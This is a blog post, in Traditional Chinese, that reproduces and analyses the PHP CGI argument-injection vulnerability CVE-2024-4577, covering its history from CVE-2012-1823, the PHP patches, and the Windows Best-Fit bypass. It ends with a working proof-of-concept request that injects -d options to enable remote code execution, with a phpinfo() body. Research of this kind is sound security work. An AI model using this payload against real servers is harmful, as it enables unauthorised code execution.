<!DOCTYPE html>
<html>
<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "nq90i0uzl9");
    </script>
    <!-- Microsoft Clarity ends-->
    <!-- Google tag (gtag.js) begins-->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'AW-16453505124');
    </script>
    <!-- Google tag (gtag.js) ends-->
    <!-- hexo injector head_begin end -->
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    CVE-2024-4577 PHP CGI漏洞複現及研究 丨
    

    TriangleSnake&#39;s Blog
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">TriangleSnake&#39;s Blog</a>
    <ul class="nav">
      
      <li><a href="/archives">archives</a></li>
      
      <li><a href="/about">about</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">CVE-2024-4577 PHP CGI漏洞複現及研究</div>
  <div class="post-meta">
    <div class="date">2024 八月 8日</div>
    <div class="tags">
      
      <div class="tag-item">web</div>
      
      <div class="tag-item">CVE</div>
      
      <div class="tag-item">argument injection</div>
      
      <div class="tag-item">PHP</div>
      
    </div>
  </div>
  

  <main class="post-content"><h1 id="漏洞簡介"><a href="#漏洞簡介" class="headerlink" title="漏洞簡介"></a>漏洞簡介</h1><p>CVE-2024-4577是一個 PHP CGI 的參數注入漏洞，這個漏洞繞過了 CVE-2012-2311 的保護，透過 windows BEST-Fit 的特性，構造不存在的 urlencode 字元讓 Windows 解析出 <code>-</code> 字元，從而繞過 php cgi 的保護機制。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>要了解這個漏洞，我們需要先坐時光機回到最初的漏洞，也就是CVE-2012-2311更之前的 PHP 5.3.11</p>
<h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>首先，我們有一個先備知識要知道，那就是 <code>http server</code> 呼叫 <code>CGI</code> 時，會連同 request 的 query 一起當成參數傳給 <code>CGI</code> ，例如：我今天存取了 <a target="_blank" rel="noopener" href="http://192.168.22.16/php-cgi/php-cgi.exe?foo">http://192.168.22.16/php-cgi/php-cgi.exe?foo</a> 時，<code>apache</code> 啟動<code>CGI</code> 的 commandline 其實長這樣：<br><img src="/2024/08/08/CVE-2024-4577-PHP-CGI%E6%BC%8F%E6%B4%9E%E8%A4%87%E7%8F%BE%E5%8F%8A%E7%A0%94%E7%A9%B6/1.png"></p>
<p>因此攻擊者只要構造出開頭為 <code>-</code> 的 querystring ， <code>CGI</code> 就會把他當成參數解析，從而導致參數注入漏洞。</p>
<h3 id="漏洞修補"><a href="#漏洞修補" class="headerlink" title="漏洞修補"></a>漏洞修補</h3><p>針對 CVE-2012–1823 出現的漏洞，PHP在 5.3.12 將漏洞 patch 掉，方法是檢查 <code>querystring</code> 的開頭是不是 <code>-</code></p>
<pre><code class="highlight c">-	<span class="keyword">while</span> ((c = php_getopt(argc, argv, OPTIONS, &amp;php_optarg, &amp;php_optind, <span class="number">0</span>)) != <span class="number">-1</span>) &#123;
+	<span class="keyword">if</span>(query_string = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>)) &#123;
+		decoded_query_string = strdup(query_string);
+		php_url_decode(decoded_query_string, <span class="built_in">strlen</span>(decoded_query_string));
+		<span class="keyword">if</span>(*decoded_query_string == <span class="string">&#x27;-&#x27;</span> &amp;&amp; <span class="built_in">strchr</span>(query_string, <span class="string">&#x27;=&#x27;</span>) == <span class="literal">NULL</span>) &#123;
+			skip_getopt = <span class="number">1</span>;
+		&#125;
+		<span class="built_in">free</span>(decoded_query_string);
+	&#125;
+	<span class="keyword">while</span> (!skip_getopt &amp;&amp; (c = php_getopt(argc, argv, OPTIONS, &amp;php_optarg, &amp;php_optind, <span class="number">0</span>)) != <span class="number">-1</span>) &#123;</code></pre>

<h2 id="CVE-2012-2311"><a href="#CVE-2012-2311" class="headerlink" title="CVE-2012-2311"></a>CVE-2012-2311</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在 5.3.12 發佈後不到一個禮拜就被人 bypass 了，因為只要在<code>-</code>前面塞空格就好(?)</p>
<h3 id="漏洞修補-1"><a href="#漏洞修補-1" class="headerlink" title="漏洞修補"></a>漏洞修補</h3><p>PHP官方很快就發佈了 5.3.13 版本，這次他們先把前面的空白都變不見(pointer往後移)，再檢查開頭是不是 <code>-</code></p>
<pre><code class="highlight c"><span class="keyword">for</span> (p = decoded_query_string; *p &amp;&amp;  *p &lt;= <span class="string">&#x27; &#x27;</span>; p++) &#123;
			<span class="comment">/* skip all leading spaces */</span>
		&#125;
		<span class="keyword">if</span>(*p == <span class="string">&#x27;-&#x27;</span>) &#123;
			skip_getopt = <span class="number">1</span>;
		&#125;</code></pre>

<h2 id="CVE-2024-4577"><a href="#CVE-2024-4577" class="headerlink" title="CVE-2024-4577"></a>CVE-2024-4577</h2><p>時隔12年，這個保護機制又被繞掉了，但這次並不影響到全部的php版本，而是只有某些特定語系的 Windows 作業系統，且需要由 CGI 解析才會觸發。</p>
<h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>這個漏洞是因為在 Windows 上有 <a target="_blank" rel="noopener" href="https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/bestfit936.txt">BEST-Fit</a> 的特性，讓攻擊者在繁體中文等特定語系環境的 Windows 直接生出一個完全不存在的字元(0xad)卻可以被解析成 <code>-</code> ，當然，你也可以透過<a target="_blank" rel="noopener" href="https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/">這份文件</a>，找找看其他語系的 windows 有沒有可以 bypass 的字元。</p>
<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>首先，我們可以來看看 PHP CGI 有哪些參數可以下：</p>
<pre><code class="highlight bash">❯ php-cgi --<span class="built_in">help</span>                                                                                                                                                                   ─╯
Usage: php-cgi [-q] [-h] [-s] [-v] [-i] [-f &lt;file&gt;]
       php-cgi &lt;file&gt; [args...]
  -a               Run interactively
  -b &lt;address:port&gt;|&lt;port&gt; Bind Path <span class="keyword">for</span> external FASTCGI Server mode
  -C               Do not <span class="built_in">chdir</span> to the script<span class="string">&#x27;s directory</span>
<span class="string">  -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory</span>
<span class="string">  -n               No php.ini file will be used</span>
<span class="string">  -d foo[=bar]     Define INI entry foo with value &#x27;</span>bar<span class="string">&#x27;</span>
<span class="string">  -e               Generate extended information for debugger/profiler</span>
<span class="string">  -f &lt;file&gt;        Parse &lt;file&gt;.  Implies `-q&#x27;</span>
  -h               This <span class="built_in">help</span>
  -i               PHP information
  -l               Syntax check only (lint)
  -m               Show compiled <span class="keyword">in</span> modules
  -q               Quiet-mode.  Suppress HTTP Header output.
  -s               Display colour syntax highlighted <span class="built_in">source</span>.
  -v               Version number
  -w               Display <span class="built_in">source</span> with stripped comments and whitespace.
  -z &lt;file&gt;        Load Zend extension &lt;file&gt;.
  -T &lt;count&gt;       Measure execution time of script repeated &lt;count&gt; <span class="built_in">times</span>.</code></pre>
<p>應該可以馬上發現， <code>-d</code> 參數非常有用，你可以把所有會妨礙你使用 <code>LFI</code> to RCE 的安全選項全部關掉，然後再用偽協議把髒髒的東西都寫進來</p>
<pre><code class="highlight php">POST http:<span class="comment">//example.com/?-d%20allow_url_include%3Don%20-d%20auto_prepend%3Dphp%3A%2F%2Finput%2F%0A</span>

<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span></code></pre>
<p><img src="/2024/08/08/CVE-2024-4577-PHP-CGI%E6%BC%8F%E6%B4%9E%E8%A4%87%E7%8F%BE%E5%8F%8A%E7%A0%94%E7%A9%B6/2.png" alt="透過php://filter偽協議include惡意程式碼"></p>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright © TriangleSnake</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>